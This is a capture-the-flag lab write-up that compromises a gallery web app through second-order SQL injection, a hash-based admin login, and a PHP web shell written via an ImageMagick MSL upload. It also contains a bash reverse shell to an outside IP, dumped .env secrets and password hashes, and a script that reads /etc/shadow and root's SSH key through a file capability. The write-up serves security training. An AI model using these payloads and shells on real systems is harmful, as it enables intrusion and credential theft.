## Port Scan

```bash
rustscan -a 10.129.229.27 -r 1-65535
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

This means a heavy and long web-based exploitation!
## Port 80

Visit the website

![](pics/Pasted%20image%2020260911102018.png)

it is a login/register page with image gallery as the title maybe we will see a file upload vulnerability?

Lets register

![](pics/Pasted%20image%2020260911102310.png)

![](pics/Pasted%20image%2020260911102333.png)

![](pics/Pasted%20image%2020260911102352.png)

![](pics/Pasted%20image%2020260911102409.png)

Nothing caught my eyes but lets see the requests generated in burp.

## Fuzzing directories

```bash
ffuf -u http://10.129.229.27/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -s
```

![](pics/Pasted%20image%2020260912123026.png)
## JWT check

![](pics/Pasted%20image%2020260911102706.png)

There is a JWT token lets test that, Also the images links are exposed

```json
{"id":15,"file":"public\/nature\/edoardo-botez-rm8q_Gy2iJs-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/edoardo-botez-rm8q_Gy2iJs-unsplash.jpg"},
```

JWT token decoded

![](pics/Pasted%20image%2020260911102933.png)

Testing the JWT token

```bash
python3 jwt_tool.py -t http://10.129.229.27/gallery#/profile -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjIyOS4yNy9hcGkvdjEvYXV0aC9sb2dpbiIsImlhdCI6MTc4OTExMTMxOSwiZXhwIjoxNzg5MTMyOTE5LCJuYmYiOjE3ODkxMTEzMTksImp0aSI6Ikx0QWM3RlNhU01McGwxRVMiLCJzdWIiOiIyOCIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.0okSxzFyasM3jGPYb9nQUBeQps-KNHFciZKwfclj8tM" -M pb
```

Nothing found so I looked closer at the multiple tokens used by this website

![](pics/Pasted%20image%2020260911105452.png)

There is a non jwt token called `intentions_session` which might be a hint since the machine name is inetentions.

I decoded it.

```json
{"iv":"StHT5LzPOtLyjbhVh8yfJQ==","value":" Ka2zzYoHW9NfOMOznrGEaKusE/1GA02IUPMEAVvV1lxqt1s5lDPMcF3ScISV/dHRhwVH41PDZf2e0e9BreCq9fnO9YV47yqaAckWwvvqmfX/KGZ73THzf1Qm4ZxyHlE","mac":"30e68b3e836b67419ca7d8f7c069385ce32317012e3ef96b869b93eb8ee36a73","tag":""}7
```

![](pics/Pasted%20image%2020260911105602.png)

```
{
  "iv": "ILgrYCwyuj7a6zZLNhij8Q==",
  "value": "7oJJVIPeMbWIxLfM3eJeQggW8lig023y/wimEZWZWxIAcrmwsfv+81dDz/WNSl7jH4BiPnyGqOimk0Wvvl7OzYKqA3jSNiov/jVUgLzfjp0531Q0wmAOwZcC4iiKmZzb",
  "mac": "99370be9e848923d97a7e24bc1ddd6b57e19bc4818bfd8ab5b81f3adbe41805b",
  "tag": ""
}
```

I decided to move on from this on test for other things for now...Like this template injection payload

![](pics/Pasted%20image%2020260911144821.png)

## Testing for injection

So the `/api/v1/gallery/user/feed` endpoint rely on the user preferance to choose the right content for him from the database.

![](pics/Pasted%20image%2020260911144950.png)

After I injected the payload into my favorite genres section lets load the feed

![](pics/Pasted%20image%2020260911145038.png)

We get Server Error so something here is vulnerable. keep deleting characters until the server error go away to see what char is causing this.

![](pics/Pasted%20image%2020260911154002.png)

When I removed the `'` char the error went away.  So this is a database error meaning we have a SQLi

![](pics/Pasted%20image%2020260911154151.png)

## Exploiting SQLi second-order

Lets play with it. Started with a simple payload

```
food'-- -
```

![](pics/Pasted%20image%2020260911185742.png)

It failed so I needed to know what query the server is using to retrieve the data. Since it is using comma to sperate genres. like this:

![](pics/Pasted%20image%2020260911185908.png)

```sql
SELECT * FROM table WHERE genre IN ('food','animals');
```

But this require the genres to be in multiple string segments but lets try to close the function bracket using this payload:

```sql
food')-- -
```

![](pics/Pasted%20image%2020260911190543.png)

This did not work also lets try another comment style

![](pics/Pasted%20image%2020260911191114.png)

When I tried `#` it worked

![](pics/Pasted%20image%2020260911191158.png)

Now lets try a simple union payload

```
food')order by 1#
```

![](pics/Pasted%20image%2020260911191241.png)

Now it fails so there is a problem so I tried these bypass techniques

![](pics/Pasted%20image%2020260911191339.png)

This payload worked to bypass the server error

```sql
food')order/**/by/**/1#
```

![](pics/Pasted%20image%2020260911191542.png)

Now lets find out how many columns are being returned. I kept increasing the number until I hit a server error.

```sql 
food')order/**/by/**/1#
food')order/**/by/**/2#
food')order/**/by/**/3#
food')order/**/by/**/4#
food')order/**/by/**/5#
food')order/**/by/**/6# -- ERROR HERE
```

![](pics/Pasted%20image%2020260911191809.png)

This means there is 5 columns returned from this query.

```sql
')union/**/select/**/NULL,NULL,NULL,NULL,NULL#
```

![](pics/Pasted%20image%2020260911192153.png)

I picked the column one to dump information inside. First I will enumerate the dbs

```sql
')union/**/select/**/NULL,/**/(select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),NULL,NULL,NULL#
```

![](pics/Pasted%20image%2020260911195827.png)

Found a db named intentions, lets extract tables and columns of every table

```sql
')union/**/select/**/NULL,/**/(select/**/group_concat(table_name,'->',column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'intentions'),NULL,NULL,NULL#

clear version
union select NULL,(select group_concat(table_name,'->',column_name) from information_schema.columns where table_schema like 'intentions'), NULL, NULL, NULL#
```

![](pics/Pasted%20image%2020260911201204.png)

```
gallery_images->id,
gallery_images->file,
gallery_images->genre,
gallery_images->created_at,
gallery_images->updated_at,

personal_access_tokens->id,
personal_access_tokens->tokenable_type,
personal_access_tokens->tokenable_id,
personal_access_tokens->name,
personal_access_tokens->token,
personal_access_tokens->abilities,
personal_access_tokens->last_used_at,
personal_access_tokens->created_at,
personal_access_tokens->updated_at,

migrations->id,
migrations->migration,
migrations->batch,

users->id,
users->name,
users->email,
users->password,
users->created_at,
users->updated_at,
users->admin,
users->genres
```

I saw there is a users table lets dump the emails and passwords. Crafted this payload 

```sql
')union/**/select/**/NULL,/**/(select/**/group_concat(email,'%\n',password)/**/from/**/users),NULL,NULL,NULL#
```

These are the dumped creds lets see what we have here

![](pics/Pasted%20image%2020260911201908.png)

```
steve@intentions.htb:$2y$10$M\/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
greg@intentions.htb:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
hettie.rutherford@example.org:$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6
nader.alva@example.org:$2y$10$WkBf7NFjzE5GI5SP7hB5\/uA9Bi\/BmoNFIUfhBye4gUql\/JIc\/GTE2
jones.laury@example.com:$2y$10$JembrsnTWIgDZH3vFo1qT.Zf\/hbphiPj1vGdVMXCk56icvD6mn\/ae
wanda93@example.org:$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW
mwisoky@example.org:$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B\/0nnHyTSMf1pbEoz6Ghjq.ecA7.
lura.zieme@example.org:$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4\/dXv1jnfBVCpaR2h.SDDioy2
pouros.marcus@example.net:$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3\/Kx82hjqbJFMO
mellie.okon@example.com:$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx\/kpO\/XcKw1m
trace94@example.net:$2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W
kayleigh18@example.com:$2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi
tdach@example.com:$2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.
lindsey.muller@example.org:$2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS
tschmidt@example.org:$2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm
murray.marilie@example.com:$2y$10$I7I4W5pfcLwu3O\/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S
barbara.goodwin@example.com:$2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY\/ny1.kp\/qFzU22t0aBNJHEMkg2
maggio.lonny@example.org:$2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB\/N2\/lf76YTn1FQGiya
chackett@example.org:$2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW
layla.swift@example.net:$2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf\/OhpXbkklsHoLdA8aVt3Ei
rshanahan@example.net:$2y$10$\/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2
shyatt@example.com:$2y$10$k\/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ\/Cllvgy
sierra.russel@example.com:$2y$10$0aYgz4DMuXe1gm5\/aT.gTe0kgiEKO1xf\/7ank4EW1s6ISt1Khs8Ma
ferry.erling@example.com:$2y$10$iGDL\/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa
beryl68@example.org:$2y$10$stXFuM4ct\/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa
ellie.moore@example.net:$2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy
littel.blair@example.org:$2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou
test@t.com:$2y$10$YSpSbd3Uf63TgFkthQevE.0tvbs\/oN5VqjACPgfSTfcolsLsPQ9Ym
tes2@t.com:$2y$10$lvRz8ZBHaHYRfTtVjpfgVuHluZ0RuI2X4PM\/OXQnvuBj5X\/65xL\/a
```

Next step is finding what type of hash is this...So I searched in hashcat examples page

![](pics/Pasted%20image%2020260911202754.png)

I created a file called `hashes.bcrypt` and saved the hashes inside

![](pics/Pasted%20image%2020260911203256.png)

This is not smart since bcrypt is not a fast hashing algorithm...So I decided to be more accurate by looking for high value targets only.

```sql
')union/**/select/**/NULL,/**/(select/**/group_concat(name,'->',admin)/**/from/**/users/**/where/**/admin/**/like/**/1),NULL,NULL,NULL#
```

![](pics/Pasted%20image%2020260911204530.png)

## Exploiting the SQLi via sqlmap

We can also use sqlmap to exploit second order sqli

```bash
sqlmap -r update_genre.req --second-req get_feed.req --batch --tamper=space2comment --level=5 
```

## Cracking bcrypt hashes (bad idea)

So I will be focusing on these hashes of these users 

```
steve: $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
greg : $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
```

```bash
 hashcat -m 3200 hashes.bcrypt /usr/share/wordlists/rockyou.txt 
```

![](pics/Pasted%20image%2020260911234728.png)

This took so long so the hashes we found might be used somewhere else. I got back to enumeration and started looking for endpoints for authentication that might allow us to use these hashes instead.

![](pics/Pasted%20image%2020260911231544.png)

## Searching for js files

This website is dynamic when you click something the website do not send request meaning this website is running on a javaScript framework. Since we identified a js directory earlier let fuzz it and see what we get.

```bash
ffuf -u http://10.129.229.27/js/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -s -e .js
```

![](pics/Pasted%20image%2020260912123228.png)

Lets check `admin.js` and search for api endpoints

![](pics/Pasted%20image%2020260912123510.png)

Turns out there is a v2 api endpoint, lets visit it. Before that I will save this snippet here

```js
methods:{modify:function(t){
var e=this;
axios.post("/api/v2/admin/image/modify",{path:this.image.path,effect:t}).then((function(t){e.modifiedData=t.data,e.hasModified=!0})).catch((function(t){}))}},
```
## Found the hash login endpoint

![](pics/Pasted%20image%2020260911234936.png)

Nice here it is. First I tested with my own hash of my test user

![](pics/Pasted%20image%2020260911235043.png)

Now lets test an admin hash. How I did is by turning burp intercept on then changing the endpoint to v2 and putting the right email and hash

![](pics/Pasted%20image%2020260911235621.png)


## Exploring the admin panel

Now Lets access the admin endpoint

![](pics/Pasted%20image%2020260911235808.png)

The first thing I noticed is the Image feature so I clicked it.

![](pics/Pasted%20image%2020260911235900.png)

I do not know what I can do with this atm but lets continue and explore the rest of the endpoints. This allow us to edit pictures

![](pics/Pasted%20image%2020260912000105.png)

Which can put effects on the picture 

![](pics/Pasted%20image%2020260912000305.png)

## Trying path traversal

![](pics/Pasted%20image%2020260912114112.png)

![](pics/Pasted%20image%2020260912114226.png)

## Exploiting Arbitrary Object Instantiations


Uploading the php file into the server

```request
POST /api/v2/admin/image/modify?&path=vid:msl:/tmp/php*&effect=wave HTTP/1.1

Host: 10.129.229.27

Content-Length: 324

X-Requested-With: XMLHttpRequest

Accept-Language: en-US,en;q=0.9

Accept: */*

Content-Type: multipart/form-data; boundary=ABC

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Origin: http://10.129.229.27

Referer: http://10.129.229.27/admin

Accept-Encoding: gzip, deflate, br

Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjIyOS4yNy9hcGkvdjIvYXV0aC9sb2dpbiIsImlhdCI6MTc4OTIwMjI2NiwiZXhwIjoxNzg5MjIzODY2LCJuYmYiOjE3ODkyMDIyNjYsImp0aSI6IjdsS2dvTElLV25uSXhjemQiLCJzdWIiOiIyIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.YBOuITxpGP73SOq1uCaXxItQZ8HJKYG0BNcjtp4zUbo; XSRF-TOKEN=eyJpdiI6IkVSbnd2eDN5ZHYrbnFNM3lCdDFMU3c9PSIsInZhbHVlIjoiRXEvSXlVdFV1anVSNE9BSEp0ZXJ5anNRd0NhWHFpY1hNa1lpWnV5Yi9rMGIvTjVBd2tkZ1VhN255UGNNOFhiSkJlbmRnT2F4ZWttSG83OE1LZnFsQVUzUGtxQURUNi90WFQ3S0R4Q3Z2K1I5SUo3aGZ6YXFpampZSG94UkhZem0iLCJtYWMiOiJhNzAwOGVjMDE1MWY1ZmQ0OTQ1OGM1NDczMDUyOWZkZWFhY2MyZTFjYjJlMmRhMWYwZDdiMWE2NjNhYTBhMjQzIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjF3S0lBS0lSNWc3dDJpZEJhWFE3ZHc9PSIsInZhbHVlIjoiN0FURC83MEhjeU9XLy9KZUEzR1NtdlE1OUNBZXUvVnJQalprekxJSzRZekswb1UxZGtjWVh2eGhJUmpOakpXUmp6YTM0ZzNKbzJyc3grQTMrZVp4bnZlank3Q3ZzK2o3UDNiMGFtZ1NNazg5QVFNbnhxRm12N1ZieGVTNjIwdkMiLCJtYWMiOiIwNmZkYTI4MjRjMjhkMjFmYzkxYjk4MzFiNGRjZTU4YjQ0MjBjYjAyMDcxMjk4MDYyMzQxZTBhNDhhNWY5MTZiIiwidGFnIjoiIn0%3D

Connection: close



--ABC

Content-Disposition: form-data; name="swarm"; filename="swarm.msl"

Content-Type: text/plain



<?xml version="1.0" encoding="UTF-8"?>

<image>

 <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;" />

 <write filename="info:/var/www/html/intentions/storage/app/public/swarm.php" />

</image>
--ABC--
```

Access The file and execute the command we want

![](pics/Pasted%20image%2020260912172213.png)

Now lets pass a reverse shell command

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.82/9911 0>&1'
```

Note: Don't forget to url encode it

![](pics/Pasted%20image%2020260912173413.png)

Got the shell

![](pics/Pasted%20image%2020260912173432.png)

## PrivEsc to greg

Linpeas.sh findings `Env Files`

```
-rw-r--r-- 1 root root 1068 Feb  2  2023 /var/www/html/intentions/.env
APP_NAME=Intentions
APP_ENV=production
APP_KEY=base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI=
APP_DEBUG=false
APP_URL=http://intentions.htb
LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=intentions
DB_USERNAME=laravel
DB_PASSWORD=02mDWOgsOga03G385!!3Plcx
BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DRIVER=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120
MEMCACHED_HOST=memcached
REDIS_HOST=redis
REDIS_PASSWORD=null
REDIS_PORT=6379
MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=null
MAIL_FROM_NAME="${APP_NAME}"
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false
PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1
MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
JWT_SECRET=yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt
```

Github files

```
drwxr-xr-x 3 root root 4096 Oct 16  2020 /var/www/html/intentions/vendor/facade/ignition-contracts/.github
drwxr-xr-x 3 root root 4096 Jul  9  2020 /var/www/html/intentions/vendor/hamcrest/hamcrest-php/.github
drwxr-xr-x 3 root root 4096 Mar  3  2022 /var/www/html/intentions/vendor/myclabs/deep-copy/.github
drwxr-xr-x 3 root root 4096 Oct 18  2021 /var/www/html/intentions/vendor/swiftmailer/swiftmailer/.github



drwxr-xr-x 8 root root 4096 Feb  3  2023 /var/www/html/intentions/.git
```

Lets analyze the dot git file, first lets archive it then put to public directory in the server so we can download it locally.

```bash
tar -cf ./public/storage/git.tar ./.git
```

![](pics/Pasted%20image%2020260912183041.png)

Extract it

```bash
tar -xvf git.tar
```

Now we can dump the git logs

```
git log
commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -> master)
Author: steve <steve@intentions.htb>
Date:   Mon Jan 30 15:29:12 2023 +0100

    Fix webpack for production

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
Author: greg <greg@intentions.htb>
Date:   Wed Jan 25 20:45:12 2023 +0100

    Adding test cases for the API!

commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd
Author: steve <steve@intentions.htb>
Date:   Fri Jan 20 14:19:32 2023 +0100

    Initial v2 commit
(END)
```

Lets check for differences between commits, focused on the test case commit because that is  where creds might be exposed.

```bash
git diff f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
```

![](pics/Pasted%20image%2020260912184210.png)

Indeed Greg left his creds hanging in a testing case commit....

```
email' => 'greg@intentions.htb', 
'password' => 'Gr3g1sTh3B3stDev3l0per!1998!'
```

Maybe he is reusing this password to login to the machine via ssh lets see.

```bash
ssh greg@10.129.229.27
```

## Flag 1

![](pics/Pasted%20image%2020260912184657.png)

## PrivEsc to 

Now lets look into the dmca_check script

![](pics/Pasted%20image%2020260912184821.png)

```
════╣ Searching folders owned by me containing others files on it (limit 100) (T1083)
-rw-r----- 1 root greg 33 Sep 12 08:18 /home/greg/user.txt
-rwxr----- 1 root greg 11044 Jun 10  2023 /home/greg/dmca_hashes.test
-rwxr-x--- 1 root greg 75 Jun 10  2023 /home/greg/dmca_check.sh

╔══════════╣ Readable files belonging to root and readable by me but not world readable (T1083)
-rwxr-x--- 1 root scanner 1437696 Jun 19  2023 /opt/scanner/scanner
-rwxr----- 1 root greg 11044 Jun 10  2023 /home/greg/dmca_hashes.test
-rwxr-x--- 1 root greg 75 Jun 10  2023 /home/greg/dmca_check.sh
-rw-r----- 1 root greg 33 Sep 12 08:18 /home/greg/user.txt
```

Running linpeas found that the scanner binary have special capability

```
/opt/scanner/scanner cap_dac_read_search=ep
```

Which allow the read of any file

## Exploit cap_dac_read_search

After understanding what the scanner binary do, it checks if a file or directory containing files contains a blacklisted item via hash comparison. Since the binary can read any file. how can we read any file via this script????

First lets look at the options we can choose

![](pics/Pasted%20image%2020260912193808.png)

There is to mandatory options:

```
/opt/scanner/scanner -d/-c <target_file_to_check> -h <file_containing_blacklist_hashes>
```

but this is not useful to us because it wont reveal the contents of the files to us. but if we combine that with `-l` option which can make us specify the number of bytes to compare that I will put to one byte then create my own blacklist of hashes by hashing every printable char and then extracting file byte by byte.

### Extracting File contents

![](pics/Pasted%20image%2020260912195251.png)

My python script to generate the hashes list with labels

```python
import hashlib

import string

for char in string.printable:
    char_hash = hashlib.md5(char.encode()).hexdigest()
    print(f"{char}:{char_hash}")
```

Put them in a hashes file

![](pics/Pasted%20image%2020260912195358.png)

Lets test our theory here, I created a test file called `test` where inputted `ABCD` lets see if we can extract the bytes

```bash
/opt/scanner/scanner -c test -h ascii.hashes -l 1
```

![](pics/Pasted%20image%2020260912195507.png)

Well we got the first byte but how can we get the rest....I thought about this and I found a solution to this by appending the char match to the hash and increment the `-l` to 2

```python
for char in string.printable:

    char_hash = hashlib.md5(b'A'+char.encode()).hexdigest()

    print(f"A{char}:{char_hash}")
```

![](pics/Pasted%20image%2020260912201149.png)

This works but at what cost I need a more efficient way to extract files. Lets script the whole process! First step is making the script run the scanner to identify the first char parse the result and detect if it is a hit.

```python
import hashlib
import string
import subprocess

for char in string.printable:
    char_hash = hashlib.md5(char.encode()).hexdigest()

    filename = "/home/greg/test"
    bytes_number = 1
    command = f"/opt/scanner/scanner -c {filename} -s {char_hash} -l {bytes_number}"

    res = subprocess.run(command, shell=True, capture_output=True, text=True)
    if res.stdout.strip().__contains__("[+]"):
        print(f"first byte is {char}")
```

**Note:** to avoid list and files I chose to use the `-s` option to parse the hash directly.

Now I will factor the code to make the hashing as a standalone function and enter a infinite loop until all the hashes do not match

```python
import hashlib

import string

import subprocess

  

filename = "/home/greg/test"

bytes_number = 1

def null(extracted=""):

    is_found = False

    for char in string.printable:

        char_hash = hashlib.md5(extracted.encode() + char.encode()).hexdigest()

        command = f"/opt/scanner/scanner -c {filename} -s {char_hash} -l {bytes_number}"

        print("[-]", command)

        res = subprocess.run(command, shell=True, capture_output=True, text=True)

        if res.stdout.strip().__contains__("[+]"):

            print(f"byte is {char}")

            is_found = True

    if is_found:

        return char

    else:

        return None

extracted_data = ""

while 1:

    byte =  null(extracted_data)

    if byte != None:

        extracted_data += byte

        bytes_number+=1

    else:

        break

    print(extracted_data)
```

Improved the visuals

![](pics/Pasted%20image%2020260912213011.png)

My first test case is dumping the /etc/shadow file

![](pics/Pasted%20image%2020260912214603.png)

Extracted hashes

```
root:$y$j9T$JjiD.nZgfr5ZSBdO4E9rY0$ZOElIJaX9F5qdpt54qFqtklDntYf/yo4kEUqqD/KFyA:19519:0:99999:7:::
steven:$y$j9T$TM/hbL/SRCyk67reQMC9C/$QHTiY3rtnGuQS1teQB7jrMys0eMkm7.tlnKFGrsoIa9:19391:0:99999:7:::
greg:$y$j9T$/LxemPBd1ROuQOmQY7OJ0/$T7eTn0juiHsctWeX3GIOynHPuGKRiFMO1F.1zzPG696:19390:0:99999:7:::
legal:$y$j9T$Sl/k/bJVnQR85nLW6kAwj1$lmrMHlaVA9/xFczVtj92LsiLw7xpd4YYrmfJ7Yv37aD:19518:0:99999:7:::
```

### Dump private ssh key

I can try to crack these but I will not there is a faster way, by extracting the ssh private key of the root but first I need to know the private key file name. By using the `-d` which list directory contents and since I will be using all ascii_letters hashes and comparing with first byte only I am guaranteed to match and print file names.

![](pics/Pasted%20image%2020260912220245.png)

Now lets use our script to dump the `id_rsa` file contents! After close to 8 mins the dump completed

![](pics/Pasted%20image%2020260912222608.png)

Copied the contents into a file on my machine, then changed the permissions so ssh would not cry on me.

![](pics/Pasted%20image%2020260912222817.png)

Now lets use it to login via ssh

```bash
ssh root@10.129.229.27 -i root_rsa.key
```

### Dump root flag

If you only wanted to get the root flag immediately without waiting 8 mins to extract the private key, you can!

![](pics/Pasted%20image%2020260912223314.png)

![](pics/Pasted%20image%2020260912224558.png)

## Flag 2

![](pics/Pasted%20image%2020260912223031.png)

![](pics/Pasted%20image%2020260912223555.png)

Done.
## Resources
https://ptswarm.com/blog/exploiting-arbitrary-object-instantiations/